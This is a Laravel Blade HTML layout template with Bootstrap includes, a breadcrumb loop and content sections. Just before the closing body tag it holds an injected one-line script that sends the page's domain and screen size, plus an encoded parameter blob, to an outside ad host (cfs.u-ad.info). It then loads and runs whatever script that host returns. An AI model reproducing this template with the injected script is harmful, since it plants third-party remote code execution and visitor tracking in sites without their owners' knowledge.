<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="{{ Helper::bootstrap() }}favicon.ico">

    <title>{{ Helper::config('title') }}</title>

    <!-- Bootstrap core CSS -->
    <link href="{{ Helper::bootstrap() }}css/bootstrap.min.css" rel="stylesheet">

    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href="{{ Helper::bootstrap() }}css/ie10-viewport-bug-workaround.css" rel="stylesheet">
    <link rel="stylesheet" href="//cdn.datatables.net/1.10.7/css/jquery.dataTables.min.css">
    
    <!--[if lt IE 9]><script src="{{ Helper::bootstrap() }}js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="{{ Helper::bootstrap() }}js/ie-emulation-modes-warning.js"></script>
    
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>

  <body>

    @include('layouts.navigation')
   
    <div class="container" style="padding-top:70px;">
     <ol class="breadcrumb">
     <?php $max = max(array_keys($breadCrumbs)); ?>
     @foreach($breadCrumbs as $index => $bread)
            
         <li class = '{{ (( $index==$max )) ? "active" : "" }}'>{{ $bread }}</li>
     
     @endforeach
      
    </ol>
    @yield('content')

    </div>


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <script src="//cdn.datatables.net/1.10.7/js/jquery.dataTables.min.js"></script>
    <script>window.jQuery || document.write('<script src="{{ Helper::bootstrap() }}js/vendor/jquery.min.js"><\/script>')</script>
    <script src="{{ Helper::bootstrap() }}js/bootstrap.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="{{ Helper::bootstrap() }}js/ie10-viewport-bug-workaround.js"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpn05DGZN2%2bvHx0ZniqpV0NuKYvI4ioFNjheuAMmUrkC11sybXNQr6aK9%2bPVYBoHMNGq6hIYKEZ6HTVEE3bV%2biFvV4ti6IUsoLZ0SPjQD12j146TJxN%2foYQvutBHDH0Q9GjGfkqpFM0HMA8hya6o3bs96popbFI7zGFARn9%2bhB2iaSKYnM%2fEfX%2fcsZczDh3ss%2bHN5F%2bXx0PdXLZ0k%2bjlNNhqiOJK50oi6aNYxRd7Gz92Dny1mtI0Ycr6Ux7v5OdJ0kxN9xaYZIrPDw%2beximsFSC%2bFs3De4X3ZGMqB%2bw8uW%2fpIY2gcl9a1fY02nym63l4f3m9fAm0eiHPNLsegpm3Po1Jfd8YprtwEqM7NmKLrIj2zyDwcIeb17%2fvdXLyp%2f89%2fQKcPTpGiEnQJAigX%2bXGmMNdW2FXMdi%2bV4CxrkGr84SO6%2fGPT8alWG%2fl6iSJBEAxVNsdrIT43ErkQBKWmM%2b4KlTGZarhF65l6jAPngMNTleZH%2fjl%2blEg%2bfsfQ%2bRlkRKDOOV" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
    @yield('script')
</html>
